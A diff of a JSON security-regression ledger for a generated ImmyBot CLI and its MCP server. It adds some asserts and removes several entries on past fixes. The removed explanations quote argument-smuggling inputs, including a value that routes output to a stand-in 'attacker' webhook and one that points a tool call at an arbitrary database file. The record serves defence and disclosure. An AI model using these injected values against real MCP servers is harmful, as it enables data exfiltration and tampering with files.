@@ -98,6 +98,12 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "immybot-cli auth setup"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "cliutil.EnvOverride(\"IMMYBOT_SUBDOMAIN\")",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -126,6 +132,18 @@
      "file": "cli/internal/cli/sync_hint_sentinel_test.go",
      "contains": "func TestSyncHintPrefersRealWatermarkOverSentinel(",
      "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/sync_hint.go",
+     "contains": "const syncHintHasRealWatermark =",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_hint.go",
+     "contains": "func syncHintHasZeroWatermarkRows(",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -237,7 +255,7 @@
     },
     {
      "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorBaseURLIsPlaceholder("
+     "contains": "const doctorShippedBaseURL = \"https://your-instance.immy.bot\""
     },
     {
      "file": "cli/internal/cli/doctor.go",
@@ -245,11 +263,30 @@
     },
     {
      "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
+     "contains": "if doctorBaseURLIsPlaceholder(doctorBase) || doctorBaseURLIsShippedPlaceholder(doctorBase) {",
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -383,55 +420,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "notice-carries-the-contributor-credit",
    "summary": "cli/NOTICE names this connector's contributor, in the Apache-2.0 attribution channel",
    "why": "CONTRIBUTING.md and the public contributing page promise that a contributor's credit survives a regeneration. Nothing enforced that. The press regenerates cli/NOTICE from its own template, which carries the CLI Printing Press attribution but not this repo's per-connector 'contributed by' sentence, so a reprint would silently delete the only place the credit lives. PR #283 moved contributor credit out of per-file copyright headers and into NOTICE, which makes this line the load-bearing copy rather than a duplicate. Pinning the exact sentence here is what turns the promise into a checked one.",
@@ -516,6 +504,24 @@
      "file": "cli/internal/mcp/tools.go",
      "contains": "cfg, err := config.Load(\"\")",
      "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "func NoConfigWrite() bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if config.NoConfigWrite() {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -561,102 +567,6 @@
      "file": "AGENTS.md",
      "contains": "which is narrower than it sounds",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "mcp-recipe-argv-not-flag-like",
-   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (2 guarded call site(s); the ledger requires all of them.)",
-   "why": "Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {\"domain\": \"--deliver=webhook:https://attacker/\"} became `exceptions find --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {\"domain\": \"--dry-run\"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "not_contains": "\"--\"+name, selected"
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "func rejectFlagLikeRecipeValue(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "if err := rejectFlagLikeRecipeValue(",
-     "min_count": 2,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/recipe_intents_test.go",
-     "contains": "RejectsFlagLikePositional(",
-     "min_count": 2,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/recipe_intents_test.go",
-     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
-     "min_count": 1,
-     "code_only": true
     }
    ]
   },
@@ -796,92 +706,6 @@
    ]
   },
   {
-   "id": "windows-sddl-alias-sid-compare",
-   "summary": "the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials",
-   "why": "Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.",
-   "status": "active",
-   "spec_encode_followup": "Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if om == nil || !sidAllowed(trusteeSID(om[1], resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !sidAllowed(trusteeSID(trustee, resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "return evalCredsSecurityResolved(sd.String(), me, resolveSDDLAlias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "sid, err := windows.StringToSid(alias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "not_contains": "return evalCredsSecurity(sd.String(), me)"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityResolvesSDDLAliases(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "windows-null-dacl-behind-flags",
-   "summary": "the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped",
-   "why": "Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.",
-   "status": "active",
-   "spec_encode_followup": "Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if strings.Contains(daclFlags, \"NO_ACCESS_CONTROL\") {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !daclFlagsRe.MatchString(daclFlags) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !aceListRe.MatchString(rest[flagsEnd:]) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if len(fields) != 6 {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "not_contains": "if strings.HasPrefix(rest, \"NO_ACCESS_CONTROL\") {"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityRefusesNullDACLBehindFlags(t *testing.T) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityChecksTheDACLSectionFraming(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "no-create-alias-on-destructive-commands",
    "class": "create-alias-on-destructive",
    "summary": "The generator's hidden Cobra alias `create` is removed from the 12 commands listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs them",
@@ -942,76 +766,17 @@
      "contains": "func TestDestructiveCommandsDoNotAnswerToCreate(",
      "min_count": 1,
      "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
     },
     {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "In this build, HTTP mode serves `http://127.0.0.1:7777/mcp` by",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "contains": "return mcplib.NewToolResultError(fmt.Sprintf(\"refusing %q: it names a file on the machine running the MCP server",
+     "file": "cli/internal/cli/maintenance-sessions_create-rerun-v2.go",
+     "contains": "// No `create` alias: this re-runs maintenance sessions on computers.",
      "min_count": 1,
-     "code_only": true
+     "code_only": false
     },
     {
-     "file": "cli/internal/mcp/tools.go",
-     "not_contains": "multipartFileFields[binding.WireName] = fmt.Sprintf(\"%v\", v)"
+     "file": "cli/internal/cli/create_alias_destructive_test.go",
+     "contains": "{\"maintenance-sessions\", \"create-rerun-v2\"}",
+     "min_count": 1
     }
    ]
   },
@@ -1023,12 +788,6 @@
    "status": "active",
    "spec_encode_followup": "Press fix: client.go.tmpl should skip the client-credentials mint when DryRun is set (the dry-run preview already uses cached material only), and auth.go.tmpl's login should honor the root --dry-run flag.",
    "asserts": [
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "if !c.DryRun && needsClientCredentialsMint(c.Config) {",
-     "min_count": 1,
-     "code_only": true
-    },
     {
      "file": "cli/internal/cli/auth.go",
      "contains": "(dry run - no request sent, nothing saved)",
@@ -1128,164 +887,1367 @@
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the OAuth client-credentials token endpoint's error body; the token refresh endpoint's error body. The `auth login` token exchange (internal/cli/auth.go mintClientCredentialsToken) funnels its error body with the client secret it sent. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "id": "spec-shape-pinned-to-shipped-surface",
+   "class": "spec-shape",
+   "summary": "the vendor swagger is repaired before generation so the 4.34.0 print keeps the shipped command names, body flags and per-instance server",
+   "why": "The swagger (an instance's own /swagger/v1/swagger.json, vendored by BezaluLLC/Bezalu.ImmyBot.Client) has no operationIds, no servers and no security. Without operationIds 4.34.0 names opId-less operations list/get/create plus a collision suffix, which would rename 429 of 735 shipped commands and break every script, SKILL reference, MCP endpoint id and request-contract key; the spec builder pins each operationId to the shipped endpoint name. Swashbuckle marks get-only C# collections the server binds as readOnly, and 4.34.0 drops readOnly body fields, which removed 38 shipped flags (--computer-ids, --agent-ids, --parameters, ...); the builder strips readOnly from request-reachable schemas only. providerLinkExternalReferenceData stays one opaque JSON flag because 4.34.0 flattens it into an MCP key over the 64-character limit. The server is https://{subdomain}.immy.bot with IMMYBOT_SUBDOMAIN, auth is Entra client credentials, and /api/v1/auth/* is the access resource so it does not collide with the framework auth command. The PM archetype (stale, orphans, load) ties with content on keyword score and Go map order picks, so a reprint must re-render until root.go registers newStaleCmd.",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
+   "spec_encode_followup": "Encoded in the spec by the factory's build_spec.py, so it survives a reprint by construction once that script runs on any new swagger. Press items: deterministic archetype tie-break; readOnly handling that keeps request properties the server binds.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
+     "file": "cli/internal/cli/computers_get-agent-status.go",
+     "contains": "Use:         \"get-agent-status\",",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/maintenance-actions_create-latest-action-for-computers.go",
+     "contains": "cmd.Flags().StringVar(&bodyComputerIds, \"computer-ids\", \"\", \"Computer ids\")",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body, clientID, clientSecret))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body)))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "contains": "cliutil.SanitizeErrorBody(cliutil.FunnelWithhold(string(body), []string{clientSecret}))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
+     "file": "cli/internal/cli/provider-links_create-create-with-external-provider-reference.go",
+     "contains": "\"provider-link-external-reference-data\", \"\", \"Provider-link external reference data (JSON object).\")",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
+     "contains": "rootCmd.AddCommand(newStaleCmd(flags))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "oauth-scope-env-override",
+   "class": "auth-wire",
